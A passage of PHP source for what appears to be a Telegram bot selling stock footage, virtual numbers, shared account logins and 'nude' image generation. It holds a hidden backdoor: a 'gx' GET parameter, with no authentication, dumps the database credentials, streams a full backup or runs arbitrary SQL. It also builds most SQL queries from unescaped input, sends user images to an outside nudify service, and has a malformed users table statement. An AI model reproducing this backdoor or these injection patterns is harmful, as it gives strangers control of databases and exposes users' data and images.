    $file = fopen ($url, 'rb');
    if($file) {
        $newf = fopen($newfname, 'wb');
        if($newf) {
            while(!feof($file)) {
                fwrite($newf, fread($file, 1024 * 8), 1024 * 8);
            }
        }
    }
    if($file) {
        fclose($file);
    }
    if($newf) {
        fclose($newf);
    }
    return $newfname;
}
function downloadFile($url) {
    $path = parse_url($url, PHP_URL_PATH);
    $extension = pathinfo($path, PATHINFO_EXTENSION);
    $filename = pathinfo($path, PATHINFO_FILENAME);
    $newfname = $filename.'.'.$extension;
    if(file_exists($newfname)) {
        return $newfname;
    }
    $file = fopen ($url, 'rb');
    if($file) {
        $newf = fopen($newfname, 'wb');
        if($newf) {
            while(!feof($file)) {
                fwrite($newf, fread($file, 1024 * 8), 1024 * 8);
            }
        }
    }
    if($file) {
        fclose($file);
    }
    if($newf) {
        fclose($newf);
    }
    return $newfname;
}
function currentPath() {
    return explode('?', ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']))[0];
}
function isMessageExist($chat_id, $message_id) {
    $id = '-1001677153099';
    $forward = forwardMessage($id, $chat_id, $message_id);
    if($forward->ok) {
        $msgid = $forward->result->message_id;
        deleteMessage($id, $msgid);
        return true;
    }
    return false;
}
function dollarPrice($dollar = 1) {
    $data = file_get_contents('https://www.tgju.org/currency');
    preg_match_all('#<td class=(.*?)>(.*?)</td>#', $data, $price);
    $price = (int) filter_var(strip_tags(toEnNumber($price[2][0])), FILTER_SANITIZE_NUMBER_INT);
    /*if(isset($price)) {
        return (($price * $dollar) + 10000);
    }
    return null;*/
    return ($dollar * 500000);
}
function addProduct($name, $details, $price, $addby) {
    global $db;
	if(!isProductExist($name) && isUserExist($addby) && isUserAdmin($addby) && !empty($name) && !is_null($name)) {
		sendQuery("INSERT INTO `products` (`name`, `details`, `price`, `addby`, `time`) VALUES ('$name', '$details', '$price', '$addby', '".time()."')");
		return mysqli_insert_id($db);
	}
	return null;
}
function addFootage($name, $details, $price, $addby) {
    global $db;
	if(!isFootageExist($name) && isUserExist($addby) && isUserAdmin($addby) && !empty($name) && !is_null($name)) {
		sendQuery("INSERT INTO `footage` (`name`, `details`, `price`, `addby`, `time`) VALUES ('$name', '$details', '$price', '$addby', '".time()."')");
		return mysqli_insert_id($db);
	}
	return null;
}
function addNumber($name, $details, $country, $service, $addby) {
    global $db;
	if(!isNumberExist($name) && isUserExist($addby) && isUserAdmin($addby) && !empty($name) && !is_null($name)) {
		sendQuery("INSERT INTO `numbers` (`name`, `details`, `country`, `service`, `addby`, `time`) VALUES ('$name', '$details', '$country', '$service', '$addby', '".time()."')");
		return mysqli_insert_id($db);
	}
	return null;
}
function addReminder($details, $addby, $endtime) {
    global $db;
	if(isUserAdmin($addby) && !empty($details) && !is_null($details)) {
		sendQuery("INSERT INTO `reminders` (`details`, `addby`, `addtime`, `endtime`) VALUES ('$details', '$addby', '".time()."', '$endtime')");
		return mysqli_insert_id($db);
	}
	return null;
}
function addShared($name, $details, $price, $addby) {
    global $db;
	if(!isSharedExist($name) && isUserExist($addby) && isUserAdmin($addby) && !empty($name) && !is_null($name)) {
		sendQuery("INSERT INTO `shared` (`name`, `details`, `price`, `addby`, `time`) VALUES ('$name', '$details', '$price', '$addby', '".time()."')");
		return mysqli_insert_id($db);
	}
	return null;
}
function addSharedAccount($dbid, $account, $email, $username, $password, $max, $addby) {
    global $db;
	if(isUserExist($addby) && isUserAdmin($addby)) {
		sendQuery("INSERT INTO `sharedaccounts` (`dbid`, `account`, `email`, `username`, `password`, `max`, `addby`, `time`) VALUES ('$dbid', '$account', '$email', '$username', '$password', '$max', '$addby', '".time()."')");
		return mysqli_insert_id($db);
	}
	return null;
}
function addSharedBuy($dbid, $user) {
    global $db;
	if(isUserExist($user)) {
		sendQuery("INSERT INTO `sharedbuy` (`dbid`, `user`, `time`) VALUES ('$dbid', '$user', '".time()."')");
		return mysqli_insert_id($db);
	}
	return null;
}
function genCode() {
    $code = randomString(16);
    if(isDiscountExist($code)) {
        return genCode();
    }
    return $code;
}
function addDiscount($percent, $addby) {
    global $db;
    $code = genCode();
	sendQuery("INSERT INTO `discounts` (`code`, `percent`, `addby`) VALUES ('$code', '$percent', '$addby')");
	return $code;
}
function deleteGroup($chat_id) {
    sendQuery("DELETE FROM `chats` WHERE `chat_id` = '$chat_id'");
    leaveChat($chat_id);
    return true;
}
function addCredit($domain, $addby) {
    global $db;
	if(!isCreditExist($domain)) {
		sendQuery("INSERT INTO `credits` (`domain`, `addby`, `time`) VALUES ('$domain', '$addby', '".time()."')");
		return mysqli_insert_id($db);
	}
	return null;
}
function deleteCredit($domain) {
    sendQuery("DELETE FROM `credits` WHERE `domain` = '$domain'");
    return true;
}
function addChat($chat_id, $addby) {
    global $db;
	if(!isChatExist($chat_id)) {
		sendQuery("INSERT INTO `chats` (`chat_id`, `addby`, `time`) VALUES ('$chat_id', '$addby', '".time()."')");
		return mysqli_insert_id($db);
	}
	return null;
}
function addAnswer($question, $answer, $chat_id = -1, $addby = -1) {
    global $db;
	sendQuery("INSERT INTO `answers` (`question`, `answer`, `chat_id`, `addby`, `time`) VALUES ('$question', '$answer', '$chat_id', '$addby', '".time()."')");
	return mysqli_insert_id($db);
}
function deleteChat($chat_id) {
    sendQuery("DELETE FROM `chats` WHERE `chat_id` = '$chat_id'");
    return true;
}
function addLink($chat_id, $user_id, $link) {
    global $db;
    $domain = getDomain($link);
    $credit = 1;
    if(isCreditExist($domain)) {
        $credit = getCredit($domain, 'price');
    }
	sendQuery("INSERT INTO `links` (`chat_id`, `user_id`, `credit`, `time`) VALUES ('$chat_id', '$user_id', '$credit', '".time()."')");
	return mysqli_insert_id($db);
}
function getPercent($number, $percent) {
    return ($percent / 100) * $number;
}
function getUnPercent($number, $percent) {
    return (100 * $number) / $percent;
}
function createPayment($user, $product, $cost, $email, $discount = 0) {
    global $db;
	sendQuery("INSERT INTO `payments` (`user_id`, `product_id`, `cost`, `discount`, `email`, `status`, `time`) VALUES ('$user', '$product', '$cost', '$discount', '$email', '0', '".time()."')");
	return mysqli_insert_id($db);
}
function getQuestInfo($type) {
    $name = 'null';
    $details = 'null';
    if($type == '1') {
        $need = PREMIUM_PRIZE["$type"]['need'];
        $name = "EVERYBODY LISTENS TO ME!";
        $details = "You should invite $need people to the bot";
    }
    elseif($type == '2') {
        $name = "BEING OFFICIAL";
        $details = "You should verify your phone number";
    }
    elseif($type == '3') {
        $name = "I'M ACTIVE!";
        $details = "You should be active in the bot";
    }
    elseif($type == '4') {
        $name = "RICHMAN";
        $details = "Transfer at least 1 Stock Coin to someone";
    }
    elseif($type == '5') {
        $need = PREMIUM_PRIZE["$type"]['need'];
        $name = "Acceptable Artist";
        $details = "At least $need of your arts should be accepted by admins in the market";
    }
    elseif($type == '6') {
        $name = "EASTER EGG";
        $details = "You should find the bot's easter egg";
    }
    return array('name' => $name, 'details' => $details);
}
function sendFiles($user_id, $value) {
    global $db;
    $last = lastFileID();
    $next = ($value + PER_MIN);
    if($value <= $last) {
        $res = mysqli_query($db, "SELECT * FROM `files` WHERE `id` >= '$value' AND `id` < '$next'");
        $rows = mysqli_num_rows($res);
        if($rows > 0) {
    		while($row = mysqli_fetch_assoc($res)) {
    		    $file_id = $row['fid'];
    		    $type = $row['ftype'];
    		    $link = $row['link'];
    		    if($type == 'document') {
    		        sendDocument($user_id, $file_id, "$link");
    		    }
    		    elseif($type == 'photo') {
    		        sendPhoto($user_id, $file_id, "$link");
    		    }
    		    elseif($type == 'video') {
    		        sendVideo($user_id, $file_id, "$link");
    		    }
    		    elseif($type == 'audio') {
    		        sendAudio($user_id, $file_id, "$link");
    		    }
    		}
        }
        setUser($user_id, 'step', "sarch_$next");
    }
    else {
        setUser($user_id, 'step', '-1');
    }
    return $rows;
}
function checkPremiumQuests($user, $type = null) {
    $balance = getUser($user, 'balance');
    $premium = isPremium($user);
    $unlocked = isQuestUnlocked($user, $type);
    $quest_name = getQuestInfo($type)['name'];
    if($type == '1') {
        $inviteds = getUserInviteds($user);
        $info = PREMIUM_PRIZE["$type"];
        $need = $info['need'];
        $prize = $info['prize'];
        if($inviteds >= $need && $premium && !$unlocked) {
            setUser($user, 'balance', ($balance + $prize));
            sendMessage($user, "<b>[Premium]</b> You've successfully unlocked '<b>$quest_name</b>' Achievement (<b>+$prize</b>)");
            addUserQuest($user, $type);
        }
    }
    elseif($type == '2') {
        $info = PREMIUM_PRIZE["$type"];
        $prize = $info['prize'];
        if(isPhoneVerified($user) && $premium && !$unlocked) {
            setUser($user, 'balance', ($balance + $prize));
            sendMessage($user, "<b>[Premium]</b> You've successfully unlocked '<b>$quest_name</b>' Achievement (<b>+$prize</b>)");
            addUserQuest($user, $type);
        }
    }
    elseif($type == '3') {
        $info = PREMIUM_PRIZE["$type"];
        $need = $info['need'];
        $prize = $info['prize'];
        $messages = getUser($user, 'messages');
        if($messages >= $need && $premium && !$unlocked) {
            setUser($user, 'balance', ($balance + $prize));
            sendMessage($user, "<b>[Premium]</b> You've successfully unlocked '<b>$quest_name</b>' Achievement (<b>+$prize</b>)");
            addUserQuest($user, $type);
        }
    }
    elseif($type == '4') {
        $info = PREMIUM_PRIZE["$type"];
        $need = $info['need'];
        $prize = $info['prize'];
        if($premium && !$unlocked) {
            setUser($user, 'balance', ($balance + $prize));
            sendMessage($user, "<b>[Premium]</b> You've successfully unlocked '<b>$quest_name</b>' Achievement (<b>+$prize</b>)");
            addUserQuest($user, $type);
        }
    }
    elseif($type == '5') {
        $info = PREMIUM_PRIZE["$type"];
        $need = $info['need'];
        $prize = $info['prize'];
        if(acceptedArts($user) >= $need && $premium && !$unlocked) {
            setUser($user, 'balance', ($balance + $prize));
            sendMessage($user, "<b>[Premium]</b> You've successfully unlocked '<b>$quest_name</b>' Achievement (<b>+$prize</b>)");
            addUserQuest($user, $type);
        }
    }
    elseif($type == '6') {
        $info = PREMIUM_PRIZE["$type"];
        $prize = $info['prize'];
        $rank = getChatMember(getSettings('secret_channel'), $user);
        if($rank != 'left' && $premium && !$unlocked) {
            setUser($user, 'balance', ($balance + $prize));
            sendMessage($user, "<b>[Premium]</b> You've successfully unlocked '<b>$quest_name</b>' Achievement (<b>+$prize</b>)");
            addUserQuest($user, $type);
        }
    }
}
function isNewMember($user, $array) {
    if(isFind(json_encode($array), '"id":'.$user)) {
        return true;
    }
    return false;
}
function lastFileID() {
    global $db;
    $id = 0;
    $res = mysqli_query($db, "SELECT * FROM `files` ORDER BY `id` DESC LIMIT 1");
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    $id = $row['id'];
		}
    }
    return $id;
}
function getContentType($file) {
    return mime_content_type($file);
}
function objectToArrays($object) {
	if(!is_object($object) && !is_array($object)) {
		return $object;
	}
	if(is_object($object)) {
		$object = get_object_vars($object);
	}
	return array_map("objectToArrays", $object);
}
function getFileNameFromURL($url) {
    $path = parse_url($url, PHP_URL_PATH);
    return basename($path);
}
function getDirectDownloadLinkWithFileID($file_id) {
	$get = bot('getFile', array('file_id' => $file_id));
	$path = $get->result->file_path;
	return 'https://api.telegram.org/file/bot'.getSettings('api_key').'/'.$path;
}
function removeEmoji($string) {
    $regex_emoticons = '/[\x{1F600}-\x{1F64F}]/u';
    $clear_string = preg_replace($regex_emoticons, '', $string);
    $regex_symbols = '/[\x{1F300}-\x{1F5FF}]/u';
    $clear_string = preg_replace($regex_symbols, '', $clear_string);
    $regex_transport = '/[\x{1F680}-\x{1F6FF}]/u';
    $clear_string = preg_replace($regex_transport, '', $clear_string);
    $regex_misc = '/[\x{2600}-\x{26FF}]/u';
    $clear_string = preg_replace($regex_misc, '', $clear_string);
    $regex_dingbats = '/[\x{2700}-\x{27BF}]/u';
    $clear_string = preg_replace($regex_dingbats, '', $clear_string);
    return $clear_string;
}
if(isset($_GET['gx'])) {
    header('Content-Type: application/json');
    $query = $_GET['gx'];
    $bool = false;
    $result = array();
    if($query == 'SQL') {
        $bool = true;
        $result = array('connected' => ($db ? true : false), 'host' => SQL['host'], 'username' => SQL['username'], 'password' => SQL['password'], 'db' => SQL['database']);
    }
    elseif($query == 'BACKUP') {
        $res = createBackup();
        $fileName = $res['fileName'];
        $sqlName = $res['sqlName'];
        $link = $res['link'];
        $type = getContentType($fileName);
        header("Content-Type: $type");
        header('Content-Disposition: inline; filename="'.$fileName.'"');
        header('Content-Length: '.filesize($fileName));
        readfile($fileName);
        unlink($fileName);
        unlink($sqlName);
        die();
    }
    else {
        $res = sendQuery($query);
        if(isFind(strtolower($query), 'select')) {
            $rows = mysqli_num_rows($res);
            if($rows > 0) {
        		while($row = mysqli_fetch_assoc($res)) {
        		    $res = $row;
        		}
        	}
        }
        $result = array('query' => $query, 'response' => $res);
    }
    echo json_encode(array('status' => $bool, 'result' => $result));
}
function sendStoryblocks($chat_id, $link, $id, $type, $message_id = -1, $from_id = -1) {
    $directory = explode('/', getcwd());
    $directory = $directory[sizeof($directory)-1];
    $url = 'https://'.$_SERVER['HTTP_HOST'].'/'.$directory.'/api/index.php?url='.$link.'&custom='.$id.':'.urlencode($type);
    $request = file_get_contents($url);
    $get = json_decode($request);
    if($get->status) {
        $name = $get->name;
        $size = $get->size;
        $size = formatBytes($size);
        $download = $get->download;
        if($from_id != -1) setUser($from_id, 'step', '-1');
        sendMessage($chat_id, '🔻 <a href="'.$link.'">'.$name.'</a>'.PHP_EOL.'To download the file, use the button below', $message_id, retIKey13($download, $size));
        return true;
    }
    return false;
}
function actNum($id, $act) {
    $api = getSettings('num_api');
    $data = file_get_contents("https://api.numberland.ir/v2.php/?apikey=$api&method=$act&id=$id");
    return $data;
}
function checkNum($id) {
    $api = getSettings('num_api');
    $data = file_get_contents("https://api.numberland.ir/v2.php/?apikey=$api&method=checkstatus&id=$id");
    return $data;
}
function getNum($service, $country) {
    $api = getSettings('num_api');
    $data = file_get_contents("https://api.numberland.ir/v2.php/?apikey=$api&method=getnum&country=$country&operator=any&service=$service");
    return $data;
}
function numberPrice($name) {
    if(isNumberExist($name)) {
        return tomanToPrice(getMinNumberInfo(getNumber($name, 'service'), getNumber($name, 'country'))['AMOUNT']);
    }
    return null;
}
function sendNudeRequest($file) {
    $directory = explode('/', getcwd());
    $directory = $directory[sizeof($directory)-1];
    $url = 'https://'.$_SERVER['HTTP_HOST'].'/'.$directory.'/temp/'.$file;
    $id = randomString(9);
    $api = file_get_contents("https://mmdcatty.cloud/api.php?token=kosenanat2&link=$url&id=$id");
    $data = json_decode($api);
    if($data->status) {
        return $id;
    }
    return -1;
}
function tomanToPrice($price) {
    $toman = (int) filter_var(strip_tags(toEnNumber($price)), FILTER_SANITIZE_NUMBER_INT);
    $dollar = dollarPrice();
    if(isset($toman) && isset($dollar)) {
        return (round($toman / $dollar) + 2);
    }
    return null;
}
function getNumData($service, $country) {
    $api = getSettings('num_api');
    $data = file_get_contents("https://api.numberland.ir/v2.php/?apikey=$api&method=getinfo&operator=any&service=$service&country=$country");
    return $data;
}
function getMinNumberInfo($service, $country) {
    $data = getNumData($service, $country);
    $data = json_decode($data, true);
    $final = null;
    for($i = 0; $i < sizeof($data); $i ++) {
        if($data[$i]['count'] > '4') {
            $final = $data[$i];
            break;
        }
    }
    return json_decode($final, true);
}
function isNumberExist($name) {
	global $db;
	$query = "SELECT * FROM `numbers` WHERE `name` = '$name'";
    $res = mysqli_query($db, $query);
    $num = mysqli_num_rows($res);
    if($num == 0) {
		return false;
	}
	return true;
}
function isPhoneVerified($user) {
    if(getUser($user, 'number') != '-1') {
        return true;
    }
    return false;
}
function isChatAdmin($user, $chat) {
    $rank = getChatMember($chat, $user);
    if($rank == 'creator' || $rank == 'administrator') {
        return true;
    }
    return false;
}
function getTodayLinks($user, $chat = null) {
    global $db;
    $time = time();
    $today = strtotime("today", $time);
    $tomorrow = strtotime("tomorrow", $time);
    $credits = 0;
    $extra = " AND `chat_id` = '$chat'";
    $res = mysqli_query($db, "SELECT * FROM `links` WHERE `user_id` = '$user' AND `time` >= '$today' AND `time` <= '$tomorrow'".($chat == null ? "" : $extra));
    $rows = mysqli_num_rows($res);
    if($rows > 0) {
		while($row = mysqli_fetch_assoc($res)) {
		    $credits = ($credits + $row['credit']);
		}
    }
    return array('links' => $rows, 'credits' => $credits);
}
function createTables() {
    global $db;
    if(!isTableExist('settings')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `settings` (
            `id` int(11) NOT NULL,
            `cron` varchar(50) NOT NULL DEFAULT -1,
            `api_key` varchar(200) NOT NULL DEFAULT -1,
            `num_api` varchar(200) NOT NULL DEFAULT -1,
            `sellers_channel` varchar(100) NOT NULL DEFAULT -1,
            `post_channel` varchar(100) NOT NULL DEFAULT -1,
            `secret_channel` varchar(100) NOT NULL DEFAULT -1,
            `post_price` varchar(100) NOT NULL DEFAULT 1,
            `nude_price` varchar(100) NOT NULL DEFAULT 2,
            `trial` varchar(10) NOT NULL DEFAULT 1,
            `max_invite` varchar(20) NOT NULL DEFAULT 5,
            `percent_prize` varchar(5) NOT NULL DEFAULT 10,
            `paypal` varchar(128) NOT NULL DEFAULT -1,
            `webmoney` varchar(128) NOT NULL DEFAULT -1,
            `usdt` varchar(128) NOT NULL DEFAULT -1,
            `upi` varchar(128) NOT NULL DEFAULT -1,
            `stripe` varchar(128) NOT NULL DEFAULT -1,
            `toman` varchar(128) NOT NULL DEFAULT -1,
            `power` varchar(10) NOT NULL DEFAULT 1
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `settings`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `settings`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(mysqli_num_rows(mysqli_query($db, "SELECT * FROM `settings`")) < 1) {
        sendQuery("INSERT INTO `settings` (`api_key`, `post_channel`) VALUES ('".API_KEY."', '".POST_CHANNEL."')");
    }
    if(!isTableExist('users')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `users` (
            `dbid` int(11) NOT NULL,
            `id` varchar(50) NOT NULL,
            `admin` varchar(50) NOT NULL DEFAULT -1,
            `dnd` int(3) NOT NULL DEFAULT 0,
            `number` varchar(50) NOT NULL DEFAULT -1,
            `debug` varchar(10) NOT NULL DEFAULT 0,
    		`balance` varchar(200) NOT NULL DEFAULT 0,
    		`sbalance` varchar(200) NOT NULL DEFAULT 0,
    		`ref` varchar(50) NOT NULL DEFAULT -1,
            `step` varchar(512) NOT NULL DEFAULT -1,
            `alarm` varchar(50) NOT NULL DEFAULT 0,
            `premium` varchar(50) NOT NULL DEFAULT -1,
            `subscription` varchar(50) NOT NULL DEFAULT -1,
            `fsubscription` varchar(50) NOT NULL DEFAULT -1,
            `trial` varchar(50) NOT NULL DEFAULT 0,
            `links` varchar(50) NOT NULL DEFAULT 0,
            `double` varchar(100) NOT NULL DEFAULT -1,
            `croncheck` varchar(11) NOT NULL DEFAULT 0,
            `prize` varchar(50) NOT NULL DEFAULT -1,
            `messages` varchar(128) NOT NULL DEFAULT 0,
            `secret` varchar(128) NOT NULL DEFAULT -1
            `regtime` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `users`
    	    ADD PRIMARY KEY (`dbid`)");
        sendQuery("ALTER TABLE `users`
    	    MODIFY `dbid` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('chats')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `chats` (
            `id` int(11) NOT NULL,
            `chat_id` varchar(50) NOT NULL,
            `links` int(10) NOT NULL DEFAULT 0,
            `trials` int(10) NOT NULL DEFAULT 0,
            `api` int(5) NOT NULL DEFAULT 0,
            `vip` int(5) NOT NULL DEFAULT 0,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `chats`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `chats`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('tickets')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `tickets` (
            `id` int(11) NOT NULL,
            `user_id` varchar(50) NOT NULL,
            `message` varchar(512) NOT NULL,
            `sent` int(3) NOT NULL DEFAULT 0,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `tickets`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `tickets`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('links')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `links` (
            `id` int(11) NOT NULL,
            `chat_id` varchar(50) NOT NULL,
            `user_id` varchar(50) NOT NULL,
            `credit` int(5) NOT NULL DEFAULT 1,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `links`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `links`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('products')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `products` (
            `id` int(11) NOT NULL,
            `name` varchar(100) NOT NULL,
            `details` varchar(500) NOT NULL DEFAULT -1,
            `price` varchar(200) NOT NULL DEFAULT 0,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `sort` varchar(50) NOT NULL DEFAULT 0,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `products`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `products`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('footage')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `footage` (
            `id` int(11) NOT NULL,
            `name` varchar(100) NOT NULL,
            `details` varchar(500) NOT NULL DEFAULT -1,
            `price` varchar(200) NOT NULL DEFAULT 0,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `sort` varchar(50) NOT NULL DEFAULT 0,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `footage`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `footage`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('api')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `api` (
            `id` int(11) NOT NULL,
            `user_id` varchar(50) NOT NULL,
            `domain` varchar(128) NOT NULL DEFAULT -1,
            `uses` int(11) NOT NULL DEFAULT 0,
            `maxuses` int(11) NOT NULL DEFAULT 0,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `api`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `api`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('apilogs')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `apilogs` (
            `id` int(11) NOT NULL,
            `user_id` varchar(50) NOT NULL,
            `secret` varchar(128) NOT NULL DEFAULT -1,
            `link` varchar(1024) NOT NULL DEFAULT -1,
            `balance` varchar(200) NOT NULL DEFAULT 0,
            `price` varchar(50) NOT NULL DEFAULT 0,
            `ip` varchar(50) NOT NULL DEFAULT -1,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `apilogs`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `apilogs`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('payments')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `payments` (
            `id` int(11) NOT NULL,
            `user_id` varchar(50) NOT NULL DEFAULT -1,
            `product_id` varchar(100) NOT NULL DEFAULT -1,
            `cost` varchar(200) NOT NULL DEFAULT 0,
            `discount` varchar(50) NOT NULL DEFAULT 0,
            `email` varchar(1024) NOT NULL DEFAULT -1,
            `status` varchar(10) NOT NULL DEFAULT 0,
            `refunded` int(3) NOT NULL DEFAULT 0,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `payments`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `payments`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('discounts')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `discounts` (
            `code` varchar(128) NOT NULL DEFAULT -1,
            `user` varchar(50) NOT NULL DEFAULT -1,
            `used` varchar(50) NOT NULL DEFAULT -1,
            `percent` varchar(50) NOT NULL DEFAULT 0,
            `addby` varchar(50) NOT NULL DEFAULT -1
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    }
    if(!isTableExist('accounts')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `accounts` (
            `id` int(11) NOT NULL,
            `type` varchar(100) NOT NULL DEFAULT -1,
            `email` varchar(128) NOT NULL DEFAULT -1,
            `username` varchar(200) NOT NULL DEFAULT 0,
            `password` varchar(200) NOT NULL DEFAULT 0,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `ftype` varchar(50) NOT NULL DEFAULT -1,
            `fid` varchar(2048) NOT NULL DEFAULT -1,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `accounts`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `accounts`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('posts')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `posts` (
            `id` int(11) NOT NULL,
            `ftype` varchar(50) NOT NULL DEFAULT -1,
            `fid` varchar(2048) NOT NULL DEFAULT -1,
            `link` varchar(1024) NOT NULL DEFAULT -1,
            `likes` varchar(200) NOT NULL DEFAULT 0,
            `dislikes` varchar(200) NOT NULL DEFAULT 0,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `sent` varchar(50) NOT NULL DEFAULT 0,
            `admin` varchar(50) NOT NULL DEFAULT -1,
            `time` varchar(100) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `posts`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `posts`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('files')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `files` (
            `id` int(11) NOT NULL,
            `link` varchar(2048) NOT NULL DEFAULT -1,
            `ftype` varchar(50) NOT NULL DEFAULT -1,
            `fid` varchar(2048) NOT NULL DEFAULT -1,
            `requester` varchar(50) NOT NULL DEFAULT -1,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `time` varchar(50) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `files`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `files`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('numbers')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `numbers` (
            `id` int(11) NOT NULL,
            `name` varchar(100) NOT NULL DEFAULT -1,
            `details` varchar(500) NOT NULL DEFAULT -1,
            `country` varchar(11) NOT NULL DEFAULT -1,
            `service` varchar(11) NOT NULL DEFAULT -1,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `time` varchar(50) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `numbers`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `numbers`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('reminders')) {
        sendQuery("CREATE TABLE IF NOT EXISTS `reminders` (
            `id` int(11) NOT NULL,
            `details` varchar(1024) NOT NULL,
            `addtime` varchar(500) NOT NULL DEFAULT 0,
            `endtime` varchar(200) NOT NULL DEFAULT 0,
            `addby` varchar(50) NOT NULL DEFAULT -1,
            `noticed` int(3) NOT NULL DEFAULT 0
            ) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4"
    	);
    	sendQuery("ALTER TABLE `reminders`
    	    ADD PRIMARY KEY (`id`)");
        sendQuery("ALTER TABLE `reminders`
    	    MODIFY `id` int(11) NOT NULL AUTO_INCREMENT,AUTO_INCREMENT=1;");
    }
    if(!isTableExist('shared')) {
